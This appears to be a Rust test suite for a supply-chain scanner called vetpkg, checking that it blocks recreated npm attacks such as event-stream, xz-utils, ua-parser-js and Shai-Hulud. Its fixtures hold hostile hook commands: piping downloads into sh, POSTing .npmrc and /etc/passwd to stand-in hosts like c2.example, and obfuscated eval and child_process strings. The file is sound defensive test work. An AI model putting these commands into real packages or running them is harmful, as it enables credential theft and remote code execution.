//! Historical supply-chain-attack benchmark suite.
//!
//! Each fixture replicates the OBSERVABLE structure of a documented real
//! attack, never the payload itself. No hostile bytes ever execute during
//! the run — fixtures are either:
//!   * `PackageIntel` constructed programmatically (for metadata-level
//!     attacks like hooks, maintainer change, dep injection), or
//!   * synthetic extracted-tarball directories (for Tier 1/2 attacks).
//!
//! Each test asserts:
//!   * expected verdict (Allow/Warn/Block), AND
//!   * the specific signal kinds that must fire.
//!
//! Any test marked `#[ignore = "known gap"]` with a documented reason is
//! an acknowledged limitation of the current signal set — treat those as
//! the explicit to-do list before a 1.0 claim.

use std::fs;
use std::path::Path;

use vetpkg::analysis::manifest::FileManifest;
use vetpkg::engine::suspicion_map::Tier0Result;
use vetpkg::engine::TierOrchestrator;
use vetpkg::platform::TempDir;
use vetpkg::signals::binary_blob::BlobInventory;
use vetpkg::signals::build_diff::BuildScriptCache;
use vetpkg::types::{Ecosystem, InstallHook, PackageIntel, PolicyConfig, Signal, Verdict};

fn write_file(root: &Path, rel: &str, content: &[u8]) {
    let p = root.join(rel);
    fs::create_dir_all(p.parent().unwrap()).unwrap();
    fs::write(&p, content).unwrap();
}

fn assert_has_signal<P: Fn(&Signal) -> bool>(signals: &[Signal], pred: P, label: &str) {
    assert!(
        signals.iter().any(pred),
        "expected signal {label} to fire; got {signals:?}"
    );
}

fn score(intel: &PackageIntel) -> (Verdict, f64, Vec<Signal>) {
    let orch = TierOrchestrator::new(PolicyConfig::default());
    let r = orch.score_tier0(intel);
    (r.verdict, r.score, r.signals)
}

// ─────────────────────────────────────────────────────────────────────────
// Group 1 — Maintainer compromise (credential theft)
// ─────────────────────────────────────────────────────────────────────────

#[test]
fn axios_rat_2026_blocks() {
    let mut cmd = String::new();
    cmd.push_str("curl http://evil.example/payload.sh | sh");
    let intel = PackageIntel {
        ecosystem: Some(Ecosystem::Npm),
        name: "axios".into(),
        version: "1.14.1".into(),
        prior_maintainers: vec!["original@axios.io".into()],
        maintainers: vec!["attacker@evil.example".into()],
        install_hooks: vec![InstallHook {
            stage: "postinstall".into(),
            command: cmd,
        }],
        prior_dependencies: vec!["follow-redirects".into(), "form-data".into()],
        dependencies: vec![
            "follow-redirects".into(),
            "form-data".into(),
            "proto-loader".into(),
        ],
        age_hours: Some(2.0),
        ..Default::default()
    };
    let (verdict, score_val, signals) = score(&intel);
    assert_eq!(verdict, Verdict::Block, "score={score_val:.2}");
    assert_has_signal(
        &signals,
        |s| matches!(s, Signal::HookCheck { .. }),
        "HookCheck",
    );
    assert_has_signal(
        &signals,
        |s| matches!(s, Signal::MaintainerChange { .. }),
        "MaintainerChange",
    );
    assert_has_signal(
        &signals,
        |s| matches!(s, Signal::NewDependency { .. }),
        "NewDependency",
    );
    assert_has_signal(
        &signals,
        |s| matches!(s, Signal::FreshPackage { .. }),
        "FreshPackage",
    );
}

#[test]
fn ua_parser_js_2021_warns_via_maintainer_and_fresh() {
    // ua-parser-js postinstall was `node jsextension` that base64-decoded
    // an embedded crypto miner. HookCheck catches the base64-decode
    // pattern; MaintainerChange catches the hijacked npm account.
    let intel = PackageIntel {
        ecosystem: Some(Ecosystem::Npm),
        name: "ua-parser-js".into(),
        version: "0.7.29".into(),
        prior_maintainers: vec!["faisalman@example.com".into()],
        maintainers: vec!["attacker@example.com".into()],
        install_hooks: vec![InstallHook {
            stage: "postinstall".into(),
            command:
                "node -e \"require('child_pro'+'cess').exec('cat jsextension | base64 -d | sh')\""
                    .into(),
        }],
        age_hours: Some(4.0),
        ..Default::default()
    };
    let (verdict, score_val, signals) = score(&intel);
    assert!(
        matches!(verdict, Verdict::Block),
        "ua-parser-js should Block, got {verdict:?} score={score_val:.2}"
    );
    assert_has_signal(
        &signals,
        |s| matches!(s, Signal::MaintainerChange { .. }),
        "MaintainerChange",
    );
    assert_has_signal(
        &signals,
        |s| matches!(s, Signal::HookCheck { .. }),
        "HookCheck",
    );
    assert_has_signal(
        &signals,
        |s| matches!(s, Signal::FreshPackage { .. }),
        "FreshPackage",
    );
}

#[test]
fn shai_hulud_wave1_blocks() {
    // Preinstall fingerprints the host (CI vs workstation) and exfiltrates
    // .npmrc + .env to an external URL.
    let intel = PackageIntel {
        ecosystem: Some(Ecosystem::Npm),
        name: "coa".into(),
        version: "2.0.3".into(),
        prior_maintainers: vec!["original@maintainer.example".into()],
        maintainers: vec!["hijacker@example.com".into()],
        install_hooks: vec![InstallHook {
            stage: "preinstall".into(),
            command: "node -e \"const h=require('child_pro'+'cess').exec; h('curl -X POST -d @/root/.npmrc http://c2.example/x')\"".into(),
        }],
        age_hours: Some(1.5),
        ..Default::default()
    };
    let (verdict, score_val, signals) = score(&intel);
    assert_eq!(verdict, Verdict::Block, "score={score_val:.2}");
    assert_has_signal(
        &signals,
        |s| matches!(s, Signal::HookCheck { .. }),
        "HookCheck",
    );
    assert_has_signal(
        &signals,
        |s| matches!(s, Signal::MaintainerChange { .. }),
        "MaintainerChange",
    );
}

#[test]
fn gluestack_2025_blocks_via_maintainer_hook() {
    let intel = PackageIntel {
        ecosystem: Some(Ecosystem::Npm),
        name: "@react-native-aria/combobox".into(),
        version: "1.4.2".into(),
        prior_maintainers: vec!["@gluestack-maintainer".into()],
        maintainers: vec!["attacker@example.com".into()],
        install_hooks: vec![InstallHook {
            stage: "postinstall".into(),
            command: "node -e \"require('child_pro'+'cess').spa'+'wn('sh',['-c','wget -qO- https://c2.example/b64 | base64 -d | sh'])\"".into(),
        }],
        age_hours: Some(6.0),
        ..Default::default()
    };
    let (verdict, _, signals) = score(&intel);
    assert_eq!(verdict, Verdict::Block);
    assert_has_signal(
        &signals,
        |s| matches!(s, Signal::HookCheck { .. }),
        "HookCheck",
    );
    assert_has_signal(
        &signals,
        |s| matches!(s, Signal::MaintainerChange { .. }),
        "MaintainerChange",
    );
}

// ─────────────────────────────────────────────────────────────────────────
// Group 2 — Dependency injection
// ─────────────────────────────────────────────────────────────────────────

#[test]
fn event_stream_2018_flags_new_flatmap_stream() {
    // Dominic Tarr transferred event-stream to right9ctrl, who added
    // flatmap-stream containing an encrypted payload targeting Copay.
    let intel = PackageIntel {
        ecosystem: Some(Ecosystem::Npm),
        name: "event-stream".into(),
        version: "3.3.6".into(),
        prior_maintainers: vec!["dominictarr@example.com".into()],
        maintainers: vec!["right9ctrl@example.com".into()],
        prior_dependencies: vec![
            "duplexer".into(),
            "from".into(),
            "map-stream".into(),
            "pause-stream".into(),
            "split".into(),
            "stream-combiner".into(),
            "through".into(),
        ],
        dependencies: vec![
            "duplexer".into(),
            "from".into(),
            "map-stream".into(),
            "pause-stream".into(),
            "split".into(),
            "stream-combiner".into(),
            "through".into(),
            "flatmap-stream".into(),
        ],
        ..Default::default()
    };
    let (_, _, signals) = score(&intel);
    assert_has_signal(
        &signals,
        |s| matches!(s, Signal::MaintainerChange { .. }),
        "MaintainerChange",
    );
    assert_has_signal(
        &signals,
        |s| matches!(s, Signal::NewDependency { name } if name == "flatmap-stream"),
        "NewDependency(flatmap-stream)",
    );
}

// ─────────────────────────────────────────────────────────────────────────
// Group 3 — Build system manipulation
// ─────────────────────────────────────────────────────────────────────────

#[test]
fn xz_utils_2024_blocks_via_tarball_analysis() {
    let td = TempDir::new("attack-xz").unwrap();
    // High-entropy "compressed blob" in test fixtures dir
    let mut blob = Vec::with_capacity(8192);
    let mut state: u64 = 0xdeadbeef;
    while blob.len() < 8192 {
        state = state
            .wrapping_mul(6364136223846793005)
            .wrapping_add(1442695040888963407);
        blob.extend_from_slice(&state.to_le_bytes());
    }
    write_file(td.path(), "tests/files/bad-corrupt.xz", &blob);
    write_file(
        td.path(),
        "m4/build-to-host.m4",
        b"# gettext-autoconf helper\n\
          gl_am_configmake=`cat tests/files/bad-corrupt.xz | xz -d | sh`\n\
          export LD_PRELOAD=/tmp/malicious.so\n",
    );

    let orch = TierOrchestrator::new(PolicyConfig::default());
    orch.suspicion.insert(
        "xz",
        "5.6.0",
        Tier0Result {
            score: 0.0,
            signals: vec![],
            cached_at: std::time::Instant::now(),
        },
    );
    let result = orch
        .score_tarball_with_context(
            "xz",
            "5.6.0",
            td.path(),
            &BlobInventory::default(),
            &BuildScriptCache {
                files: vec![vetpkg::signals::build_diff::BuildScriptEntry {
                    path: "m4/build-to-host.m4".into(),
                    content: "# gettext-autoconf helper\n".into(),
                }],
            },
            &FileManifest::default(),
            &[],
            true,
        )
        .unwrap();
    assert_eq!(result.verdict, Verdict::Block, "score {:.2}", result.score);
    assert_has_signal(
        &result.signals,
        |s| matches!(s, Signal::BinaryBlobDetection { .. }),
        "BinaryBlobDetection",
    );
    assert_has_signal(
        &result.signals,
        |s| matches!(s, Signal::BuildScriptDiff { .. }),
        "BuildScriptDiff",
    );
}

// ─────────────────────────────────────────────────────────────────────────
// Group 4 — Build-time exfiltration
// ─────────────────────────────────────────────────────────────────────────

#[test]
fn nx_singularity_2025_blocks_via_taint() {
    let td = TempDir::new("attack-nx").unwrap();
    write_file(
        td.path(),
        "package/index.js",
        b"const secrets = fs.readFileSync(process.env.HOME + '/.npmrc');\n\
          const data = fs.readFileSync('/etc/passwd');\n\
          fetch('https://telemetry.evil.example/collect', {method: 'POST', body: data});\n\
          axios.post('https://exfil.evil.example/b', {secrets, data});\n",
    );
    write_file(td.path(), "package/package.json", b"{\"name\":\"nx-like\"}");

    let orch = TierOrchestrator::new(PolicyConfig::default());
    orch.suspicion.insert(
        "nx-like",
        "1.0.0",
        Tier0Result {
            score: 0.40,
            signals: vec![],
            cached_at: std::time::Instant::now(),
        },
    );
    let result = orch
        .score_tarball_with_context(
            "nx-like",
            "1.0.0",
            td.path(),
            &BlobInventory::default(),
            &BuildScriptCache::default(),
            &FileManifest::default(),
            &[],
            false,
        )
        .unwrap();
    assert_eq!(result.verdict, Verdict::Block, "score {:.2}", result.score);
    assert!(result.tier2_score > 0.0);
    assert_has_signal(
        &result.signals,
        |s| matches!(s, Signal::TaintDetection { .. }),
        "TaintDetection",
    );
}

// ─────────────────────────────────────────────────────────────────────────
// Group 5 — CI/CD targeting
// ─────────────────────────────────────────────────────────────────────────

#[test]
fn tj_actions_tag_mutation_flagged_offline_as_unpinned() {
    use vetpkg::cli::audit_ci::{audit, AuditOptions};
    let td = TempDir::new("attack-tj").unwrap();
    write_file(
        td.path(),
        ".github/workflows/ci.yml",
        b"jobs:\n  b:\n    runs-on: x\n    steps:\n      - uses: tj-actions/changed-files@v41\n",
    );
    let opts = AuditOptions {
        path: td.path().to_path_buf(),
        online: false,
        ..Default::default()
    };
    let report = audit(&opts).unwrap();
    assert!(
        report
            .findings
            .iter()
            .any(|f| matches!(f.severity, vetpkg::ci::Severity::High)
                && f.check == vetpkg::ci::Check::UnpinnedAction),
        "expected High-severity UnpinnedAction for tj-actions@v41"
    );
}

#[test]
fn codecov_bash_uploader_secret_in_run_flagged() {
    use vetpkg::cli::audit_ci::{audit, AuditOptions};
    let td = TempDir::new("attack-codecov").unwrap();
    write_file(
        td.path(),
        ".github/workflows/ci.yml",
        b"jobs:\n  t:\n    runs-on: x\n    steps:\n      - name: codecov\n        run: |\n          curl -sSL https://codecov.io/bash | bash -s -- -t ${{ secrets.CODECOV_TOKEN }}\n",
    );
    let opts = AuditOptions {
        path: td.path().to_path_buf(),
        online: false,
        ..Default::default()
    };
    let report = audit(&opts).unwrap();
    assert!(
        report
            .findings
            .iter()
            .any(|f| matches!(f.severity, vetpkg::ci::Severity::High)
                && f.check == vetpkg::ci::Check::SecretExposure),
        "expected High SecretExposure; findings: {:#?}",
        report.findings
    );
}

// ─────────────────────────────────────────────────────────────────────────
// Group 6 — Typosquats (name-based)
// ─────────────────────────────────────────────────────────────────────────

#[test]
fn crossenv_2017_flags_against_cross_env() {
    let intel = PackageIntel {
        ecosystem: Some(Ecosystem::Npm),
        name: "crossenv".into(),
        version: "6.1.1".into(),
        ..Default::default()
    };
    let (_, _, signals) = score(&intel);
    assert_has_signal(
        &signals,
        |s| matches!(s, Signal::Typosquat { matched, .. } if matched == "cross-env"),
        "Typosquat(cross-env)",
    );
}

#[test]
fn lodahs_transposition_flags() {
    let intel = PackageIntel {
        ecosystem: Some(Ecosystem::Npm),
        name: "lodahs".into(),
        version: "0.0.1".into(),
        ..Default::default()
    };
    let (_, _, signals) = score(&intel);
    assert_has_signal(
        &signals,
        |s| matches!(s, Signal::Typosquat { matched, .. } if matched == "lodash"),
        "Typosquat(lodash)",
    );
}

// ─────────────────────────────────────────────────────────────────────────
// Group 7 — Obfuscation in install hooks
// ─────────────────────────────────────────────────────────────────────────

#[test]
fn hex_encoded_payload_in_eval_caught() {
    let intel = PackageIntel {
        ecosystem: Some(Ecosystem::Npm),
        name: "seemingly-benign".into(),
        version: "1.0.0".into(),
        install_hooks: vec![InstallHook {
            stage: "postinstall".into(),
            command: "node -e \"ev\"+\"al('\\\\x72\\\\x65\\\\x71\\\\x75\\\\x69\\\\x72\\\\x65')\""
                .into(),
        }],
        ..Default::default()
    };
    let (_, _, signals) = score(&intel);
    assert_has_signal(
        &signals,
        |s| matches!(s, Signal::HookCheck { .. }),
        "HookCheck",
    );
}

// ─────────────────────────────────────────────────────────────────────────
// Known gaps — tests documented to FAIL until the signal lands. Run with
// `cargo test -- --ignored` to see the current deltas.
// ─────────────────────────────────────────────────────────────────────────

#[test]
#[ignore = "known gap: twilio-npm is a family-prefix squat; we need a freshness+popularity cross-check to separate these from legitimate namespaced variants like source-map-js"]
fn twilio_npm_2020_known_gap() {
    let intel = PackageIntel {
        ecosystem: Some(Ecosystem::Npm),
        name: "twilio-npm".into(),
        version: "1.0.0".into(),
        age_hours: Some(2.0),
        ..Default::default()
    };
    let (_, _, signals) = score(&intel);
    assert_has_signal(
        &signals,
        |s| matches!(s, Signal::Typosquat { matched, .. } if matched == "twilio"),
        "Typosquat(twilio)",
    );
}

#[test]
#[ignore = "known gap: colors/faker self-sabotage is an infinite loop in SOURCE code, not install hook — requires source-level semantic analysis beyond current pattern matcher"]
fn colors_faker_2022_known_gap() {
    let intel = PackageIntel {
        ecosystem: Some(Ecosystem::Npm),
        name: "colors".into(),
        version: "1.4.44-liberty-2".into(),
        ..Default::default()
    };
    let (verdict, _, _) = score(&intel);
    assert!(matches!(verdict, Verdict::Block | Verdict::Warn));
}

#[test]
#[ignore = "known gap: string-concatenated URLs (\"http\"+\"://evil\") evade literal pattern matching — would need AST or runtime eval"]
fn string_concatenated_url_known_gap() {
    // Would require taint matcher that concatenates string literals.
    let _ = r#"fetch('http'+'://evil.example/x')"#;
}

#[test]
#[ignore = "known gap: dynamic require(varName) evades literal matching on require('os') — same as above"]
fn dynamic_require_known_gap() {
    let _ = r#"const mod = 'child_'+'process'; const cp = require(mod);"#;
}

// ─────────────────────────────────────────────────────────────────────────
// Summary sanity: clean package must stay Allow.
// ─────────────────────────────────────────────────────────────────────────

#[test]
fn clean_package_stays_allow() {
    let intel = PackageIntel {
        ecosystem: Some(Ecosystem::Npm),
        name: "left-pad".into(),
        version: "1.3.0".into(),
        publish_time: Some(1_500_000_000),
        ..Default::default()
    };
    let (verdict, score_val, _) = score(&intel);
    assert_eq!(verdict, Verdict::Allow, "left-pad score={score_val:.2}");
}
